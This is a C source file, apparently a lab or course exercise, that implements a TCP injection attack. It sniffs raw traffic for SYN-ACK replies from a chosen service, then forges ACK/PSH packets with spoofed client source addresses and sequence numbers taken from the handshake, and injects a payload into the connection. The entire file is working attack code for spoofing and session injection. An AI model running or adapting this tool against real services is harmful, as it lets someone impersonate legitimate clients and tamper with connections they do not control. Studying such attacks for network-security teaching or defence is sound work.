/*
 *   A injector that intervenes TCP communication to a given service.
 *   It sniffs all traffic for packets that match the given IP and port,
 *   And it will inject a spoofed packet to the service.
*/
#include <signal.h>
#include <sys/wait.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>


// Constants
#define DATAGRAMSIZE 100 // number of bytes for raw datagram
#define PSEUDOPACKETSIZE 100 // number of bytes for pseudo packet
#define DATAGRAM_MAX 65536 // max number of bytes for IP packets
#define PAYLOAD "Hello, world! I'm Eve!\n"

// Functions
uint16_t ip_checksum(void*,size_t);
void sigchld_handler(int);

// Pseudo header needed for calculating the TCP header checksum
struct pshdr {
  uint32_t src_addr;
  uint32_t dst_addr;
  uint8_t reserved;
  uint8_t protocol;
  uint16_t tcp_len;
};

int main(int argc, char *argv[]) {
    int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
    char service_ip[INET6_ADDRSTRLEN];
    uint16_t service_port;
    uint32_t service_addr, seq;
    socklen_t addr_len;
    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
    unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
    struct iphdr *iph, *new_iph;
    struct tcphdr *tcph, *cstcph, *new_tcph;
    struct pshdr *psh;
    uint16_t win = 8192, id0 = rand() %(65536);
    size_t tcp_len;
    struct sockaddr_storage saddr;
    struct sockaddr_in sa;
    char *data;

    if (argc != 3) {
	    fprintf(stderr,"usage: injection service_ip service_port\n");
	    exit(1);
	}

    if (strlen(argv[1]) > INET6_ADDRSTRLEN) {
        fprintf(stderr,"please enter a valid IP\n");
	    exit(1);
    }

    strcpy(service_ip, argv[1]);
    inet_pton(AF_INET, service_ip, &(service_addr)); 

    service_port = (uint16_t) atoi(argv[2]);
    if ((service_port >= USHRT_MAX)) {
        fprintf(stderr,"service_port < %u\n", USHRT_MAX);
	    exit(1);
    }

    service_port = htons(service_port);

    // init pointers
    new_iph = (struct iphdr *) buf;
    new_tcph= (struct tcphdr*) (new_iph + 1);

    // open attack socket
    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("injection: socket\n");
        exit(1);
    }

    //Set option IP_HDRINCL (headers are included in packet)
    if(setsockopt(attack_sock, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) < 0) {
        perror("injection: setsockopt\n");
        exit(-1);
    }

    // pre-fill TCP, IP and pseudo headers

    // carve out IP header and TCP header
    memset(datagram, 0, sizeof datagram);
    iph = (struct iphdr *) datagram;
    tcph = (struct tcphdr *) (iph + 1);
    data = (char *) (tcph + 1);
    strcpy(data, PAYLOAD);

    tcp_len = sizeof(struct tcphdr) + strlen(data);

    iph -> daddr = service_addr;
    iph -> version = 4; // IPv4
    iph -> ihl = 5; // 5 * 32 bits
    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
    iph -> id = htons(id0); // start ID
    iph -> frag_off = 0x00;
    iph -> ttl = 64; // time to live
    iph -> protocol = IPPROTO_TCP; // TCP
    
    tcph -> dest = service_port;
    tcph -> doff = 5; // 5 * 32-bit tcp header
    tcph -> ack = 1;
    tcph -> psh = 1;
    tcph -> window = htons(win); // 16 bits
    tcph -> check = 0; // 16 bits. init to 0.

    // construct psudo packet
    memset(pseudo_packet, 0, sizeof pseudo_packet);
    psh = (struct pshdr *) pseudo_packet;
    cstcph = (struct tcphdr *) (psh + 1);
    memcpy(cstcph, (char *)tcph, tcp_len);

    // pack pseudo header
    psh -> dst_addr = service_addr;
    psh -> reserved = 0;
    psh -> protocol = IPPROTO_TCP; // TCP
    psh -> tcp_len = htons(tcp_len); // TCP segment length

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = service_addr;

    // Open sniff socket
    if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("fakesync: socket\n");
        goto error;
    }

    // main loop
    while(1) {
        // capture frames
        addr_len = sizeof saddr;
        if ((num = recvfrom(sniff_sock, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
        {
            perror("recvfrom()\n");
            goto error;
        }

        if (new_iph -> protocol != IPPROTO_TCP) continue; // check if packet is TCP packet
        if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) continue; // only care about syn ack packets
        if ((new_iph -> saddr != service_addr) || (new_tcph -> source != service_port)) continue; // check if source is the service
        
        tcph -> source = new_tcph->dest; // source port
        cstcph -> source = new_tcph->dest;
        
        tcph -> seq = new_tcph->ack_seq;
        cstcph -> seq = new_tcph->ack_seq;
        seq = htonl(ntohl(new_tcph->seq) + 1);
        tcph -> ack_seq = seq; // ack sequence number
        cstcph -> ack_seq = seq;

        // dynamic pseudo fields
        psh -> src_addr = new_iph->daddr;

        // calculate check sum
        tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 

        // dynamic IP fields
        iph -> saddr = new_iph->daddr;
    
        if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
        {
            perror("fakesync: sendto()\n");
        }
    }

final:
    close(sniff_sock);
    close(attack_sock);
    return 0;
error:
    close(attack_sock);
    close(sniff_sock);
    exit(1);
}

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}